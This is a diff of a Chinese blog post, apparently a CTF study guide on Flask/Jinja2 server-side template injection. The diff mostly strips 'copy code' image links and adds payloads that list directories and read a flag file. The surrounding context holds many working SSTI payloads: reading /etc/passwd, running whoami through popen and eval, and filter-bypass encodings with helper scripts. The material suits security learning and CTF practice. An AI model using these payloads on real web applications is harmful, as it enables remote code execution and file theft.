@@ -220,7 +220,6 @@ for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():
 </code></pre>
 <p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p>
 <p>find2.py</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode.gif" alt="复制代码"></a></p>
 <pre><code>import json
 
 a = &quot;&quot;&quot;
@@ -245,7 +244,6 @@ for k,v in enumerate(allList):
     if &quot;os._wrap_close&quot; in v:
         print(str(k)+&quot;---&gt;&quot;+v)
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode.gif" alt="复制代码"></a></p>
 <p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/552cd597f7d84fcc9d284fdfe0fba5d4.jpeg" alt="img"></p>
 <p>我们首先把所有的子类列举出来</p>
 <pre><code>Python 3.7.8
@@ -254,7 +252,6 @@ for k,v in enumerate(allList):
 </code></pre>
 <p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p>
 <p>find2.py</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p>
 <pre><code>import json
 
 a = &quot;&quot;&quot;
@@ -279,7 +276,6 @@ for k,v in enumerate(allList):
     if &quot;os._wrap_close&quot; in v:
         print(str(k)+&quot;---&gt;&quot;+v)
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p>
 <p><img src="https://p6-tt-ipv6.byteimg.com/origin/pgc-image/552cd597f7d84fcc9d284fdfe0fba5d4" alt="img"></p>
 <p>又或者用如下的requests脚本去跑</p>
 <p>find3.py</p>
@@ -408,11 +404,9 @@ True
 <p>本方法只能适用于python2，因为在python3中file类已经被移除了</p>
 <p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/a9d24ae5c1bd41359cfba6666b1f6228.png" alt="img"></p>
 <p>可以使用dir查看file对象中的内置方法</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
 <pre><code>&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40])
 [&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
 <p>然后直接调用里面的方法即可，payload如下</p>
 <p>读文件</p>
 <pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;
@@ -449,9 +443,7 @@ True
 
 &#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
 <p>又或者用如下两种方式，用模板来跑循环</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
 <pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
 
 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
@@ -466,7 +458,6 @@ True
 &#123;% endif %&#125;
 &#123;% endfor %&#125;
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
 <p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f45931bb692441b6b6040aa863eaf12c.png" alt="img"></p>
 <p>读取文件payload</p>
 <pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
@@ -547,7 +538,6 @@ Cookie:arg1=open;arg2=/etc/passwd
 <p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/ce9a23785e014adda7f75ca7c05d5c33.jpeg" alt="img"></p>
 <p>然后就可以用chr来绕过传参时所需要的引号，然后需要用chr来构造需要的字符</p>
 <p>这里我写了个脚本可以快速构造想要的ascii字符</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
 <pre><code>&lt;?php
 $a = &#39;whoami&#39;;
 $result = &#39;&#39;;
@@ -559,7 +549,6 @@ echo substr($result,0,-3);
 ?&gt;
 //chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
 <p>最后payload如下</p>
 <pre><code>&#123;% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()&#125;&#125;
 </code></pre>
@@ -573,7 +562,6 @@ echo substr($result,0,-3);
 <pre><code>&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()&#125;&#125;
 </code></pre>
 <p>这里甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个python脚本方便转换</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
 <pre><code>string1=&quot;__class__&quot;
 string2=&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
 def tohex(string):
@@ -585,7 +573,6 @@ def tohex(string):
 tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f
 print(string2) #__class__
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
 <p>随便构造个payload如下</p>
 <pre><code>&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()&#125;&#125;
 </code></pre>
@@ -640,7 +627,6 @@ print(string2) #__class__
 <li>数字中的中括号</li>
 </ul>
 <p>在python里面可以使用以下方法访问数组元素</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
 <pre><code>Python 3.7.8
 &gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;][1]
 &#39;kawhi&#39;
@@ -649,7 +635,6 @@ print(string2) #__class__
 &gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].__getitem__(1)
 &#39;kawhi&#39;
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
 <p>也就是说可以使用__getitem__和pop替代中括号，取列表的第n位</p>
 <p>payload如下</p>
 <pre><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()&#125;
@@ -690,8 +675,6 @@ print(string2) #__class__
 
 如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本
 
-[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)
-
 ```
 # -*- coding: utf-8 -*-
 import requests
@@ -713,8 +696,6 @@ for i in xrange(0,100):
             break
     print password
 ```
-
-[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)
 
 - print标记
 
@@ -746,15 +727,11 @@ for i in xrange(0,100):
 
 之前某二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了attr()绕过点，values绕过args，payload如下
 
-[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)
-
 ```
 &#123;&#123;()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])&#125;&#125;
 
 post:x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('whoami').read()
 ```
-
-[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)
 
 **导入主函数读取变量**
 
@@ -792,7 +769,6 @@ flag = f.read()
 <pre><code>&#123;%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%&#125;
 </code></pre>
 <p>然后我这里顺便给个Unicode互转的php脚本</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
 <pre><code>&lt;?php
 //字符串转Unicode编码
 function unicode_encode($strLong) &#123;
@@ -857,7 +833,6 @@ echo unicode_encode(&#39;__class__&#39;);
 echo unicode_decode(&#39;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#39;);
 //\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__
 </code></pre>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
 <h1 id="魔改字符"><a href="#魔改字符" class="headerlink" title="魔改字符"></a><strong>魔改字符</strong></h1><pre><code>这种方法是在太湖杯easyWeb这道题目学到的，上面所说的过滤双大括号，在一些特定的题目可以魔改&#123;&#123;&#125;&#125;，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法
 ```
 
@@ -874,8 +849,6 @@ payload如下
 
 还可以使用中文的字符魔改
 
-[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)
-
 ```
 ｛ &#65371;
 ｝ &#65373;
@@ -890,10 +863,6 @@ payload如下
 
 总结
 ```
-
-[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)
-
-
 
 ----------
 
@@ -910,6 +879,12 @@ payload如下
 <pre><code>os._wrap_close
 payload:
 &#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;
+</code></pre>
+<pre><code>subprocess.Popen
+payload:
+?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;
+?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;
+?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;
 </code></pre>
 <p>2、有os模块的</p>
 <p>socket._socketobject（一般在71）、site._Printer等模块</p>
@@ -958,7 +933,6 @@ payload:
 </code></pre>
 <p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p>
 <p>find2.py</p>
-<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p>
 <pre><code>import json
 
 a = &quot;&quot;&quot;
@@ -983,7 +957,6 @@ for k,v in enumerate(allList):
     if &quot;os._wrap_close&quot; in v:
         print(str(k)+&quot;---&gt;&quot;+v)
 </code></pre>
-<p>[<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码">](</p>
 </div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak框架/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8Bssti%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">初始ssti漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.</span> <span class="toc-text">路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">渲染方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.3.</span> <span class="toc-text">模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">%s</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number"></span> <span class="toc-text">{{ code }}&lt;&#x2F;h1&gt;&#39;,code&#x3D;code)
 </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">0.1.</span> <span class="toc-text">SSTI文件读取&#x2F;命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">0.1.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">0.1.2.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">0.1.3.</span> <span class="toc-text">命令执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E6%A6%82%E8%BF%87%E7%A8%8B%EF%BC%88%E8%AF%BB%E5%8F%96config%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">大概过程（读取config）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E6%9C%894%E4%B8%AA%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.1.</span> <span class="toc-text">flask有4个全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E8%87%AA%E5%B8%A6%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">python自带函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#config"><span class="toc-number">1.2.1.</span> <span class="toc-text">config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#request"><span class="toc-number">1.2.2.</span> <span class="toc-text">request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session"><span class="toc-number">1.2.3.</span> <span class="toc-text">session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url-for"><span class="toc-number">1.2.4.</span> <span class="toc-text">url_for()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-flashed-messages"><span class="toc-number">1.2.5.</span> <span class="toc-text">get_flashed_messages()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">一些绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%B0%8F%E6%8B%AC%E5%8F%B7"><span class="toc-number">2.1.</span> <span class="toc-text">过滤了小括号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-class%E3%80%81-subclasses%E3%80%81-read%E7%AD%89%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-number">2.1.1.</span> <span class="toc-text">过滤了 class、 subclasses、 read等关键词</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">2.1.2.</span> <span class="toc-text">过滤了下划线_</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%AD%E6%8B%AC%E5%8F%B7-%E5%92%8C"><span class="toc-number">2.1.3.</span> <span class="toc-text">过滤了中括号[和]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-join"><span class="toc-number">2.1.4.</span> <span class="toc-text">过滤了|join</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E6%95%8C%E7%BB%95%E8%BF%87%E7%9A%84%E6%9C%80%E7%BB%88RCE"><span class="toc-number">2.1.5.</span> <span class="toc-text">无敌绕过的最终RCE</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python2%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number"></span> <span class="toc-text">python2的方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%94%B9%E5%AD%97%E7%AC%A6"><span class="toc-number"></span> <span class="toc-text">魔改字符</span></a></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/">&lt; 极客大挑战 2019 RCE ME __0X01-0X0F</a><a class="next" href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/">ssi服务端包含注入 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
 .night .v[data-class=v] a:hover { color: #216C73 !important; }
